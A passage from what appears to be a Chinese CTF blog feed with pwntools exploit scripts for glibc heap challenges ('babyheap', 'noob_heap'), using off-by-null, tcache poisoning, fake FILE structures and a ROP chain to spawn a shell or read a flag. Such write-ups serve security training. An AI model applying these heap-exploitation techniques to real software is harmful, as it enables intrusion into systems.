p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4421&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;just pwn it&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">out</span>():<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy1</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;buy\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;N\n&#x27;</span>,<span class="hljs-string">b&#x27;N&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy2</span>(<span class="hljs-params">choice,content</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;buy\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;N\n&#x27;</span>,<span class="hljs-string">b&#x27;Y&#x27;</span>)<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_coffee</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">choice,idx,content</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0x4063c0</span>))<br>out()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    buy1(<span class="hljs-number">3</span>)<br><br>login()<br>re_coffee(<span class="hljs-number">3</span>)<br>re_coffee(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x406300</span>)+p64(<span class="hljs-number">0x4062f0</span>)+p64(<span class="hljs-number">0x406018</span>))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x406000</span>))<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;3.&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>out()<br><br>buy2(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>2.38的off by null（你惦记你那逼unlink干啥呢）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babyheap&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>heap = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x2a0</span><br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>,heap)<br><br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x4f8</span>,p64(heap+<span class="hljs-number">0x7b0</span>)+p64(heap+<span class="hljs-number">0x7b0</span>)+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x4e0</span>+p64(<span class="hljs-number">0x500</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,p64(heap+<span class="hljs-number">0x2b0</span>)+p64(heap+<span class="hljs-number">0x2b0</span>))<br><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x8</span>,p64((heap&gt;&gt;<span class="hljs-number">12</span>)^(heap+<span class="hljs-number">0xae0</span>)))<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br><br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1feed0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x8</span>,p64((libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]^(heap&gt;&gt;<span class="hljs-number">12</span>))))<br><br>fake_io_addr = heap + <span class="hljs-number">0x2c0</span><br>fake_IO_struct = <span class="hljs-string">b&#x27;  sh;\x00\x00\x00&#x27;</span>   <span class="hljs-comment">#rdi</span><br>fake_IO_struct += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x4</span><br>fake_IO_struct += p64(<span class="hljs-number">1</span>)<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(heap + <span class="hljs-number">0x800</span>)<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += p64(fake_io_addr + <span class="hljs-number">0x200</span>) <span class="hljs-comment">#fake_wide_addr</span><br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += p64(libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>])<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>fake_IO_struct += p64(fake_io_addr + <span class="hljs-number">0x200</span> + <span class="hljs-number">0xe0</span>)<br>fake_IO_struct += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])  <span class="hljs-comment">#system/setcontext</span><br><br>add(<span class="hljs-number">0x408</span>,fake_IO_struct+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x408</span>,p64(heap+<span class="hljs-number">0x2c0</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>gdb.attach(p)<br>sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="强网拟态"><a href="#强网拟态" class="headerlink" title="强网拟态"></a>强网拟态</h1><p>甲级战犯第二场</p><h2 id="noob-heap"><a href="#noob-heap" class="headerlink" title="noob_heap"></a>noob_heap</h2><p>玩个🐕8堆风水，🧠要坏掉了</p><p>off by null 和malloc_consolidate的利用点是一眼就看出来了，然后👴风水做法做了四个小时实在扛不住了耻辱下班md</p><p>后来看了星盟的exp后恍然大悟。malloc_consolidate终归还是不是很熟悉，哎。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./noob_heap&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sa(<span class="hljs-string">b&#x27;: &#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x78</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x78</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">5</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#1-6</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#7-24</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i+<span class="hljs-number">7</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#0-6</span><br><br>add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#7</span><br>show(<span class="hljs-number">7</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a0f0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x78</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">13</span>,p64(heap_base+<span class="hljs-number">0x910</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>))<br>delete(<span class="hljs-number">12</span>)<br>delete(<span class="hljs-number">11</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><br>edit(<span class="hljs-number">10</span>, p64((heap_base + <span class="hljs-number">0x790</span>))*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>))<br>delete(<span class="hljs-number">9</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x78</span>)<br><br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">14</span>,p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]^(heap_base&gt;&gt;<span class="hljs-number">12</span>))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>])<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]) + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]+<span class="hljs-number">8</span>))<br><br>stack = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret_addr = stack - <span class="hljs-number">0x138</span> - <span class="hljs-number">0x60</span><br><br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">14</span>,p64(ret_addr^(heap_base&gt;&gt;<span class="hljs-number">12</span>))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>])<br><br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br><br>pop_rdi = <span class="hljs-number">0x000000000002a3e5</span> + libc.address<br>pop_rsi = <span class="hljs-number">0x0000000000160498</span> + libc.address<br>pop_rdx = <span class="hljs-number">0x00000000000796a2</span> + libc.address<br>lea_ret = <span class="hljs-number">0x000000000004da83</span> + libc.address<br>orw = flat([<br>    pop_rdi,ret_addr,<br>    pop_rsi,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],<br>    pop_rdi,<span class="hljs-number">3</span>,<br>    pop_rsi,heap_base+<span class="hljs-number">0x300</span>,<br>    pop_rdx,<span class="hljs-number">0x40</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    pop_rdi,<span class="hljs-number">1</span>,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],<br>])<br>edit(<span class="hljs-number">0</span>,orw)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(lea_ret) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(heap_base+<span class="hljs-number">0x7a0</span>-<span class="hljs-number">8</span>) + p64(lea_ret))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF</title>
    <link href="/2023/10/31/ACTF/"/>
    <url>/2023/10/31/ACTF/</url>
    
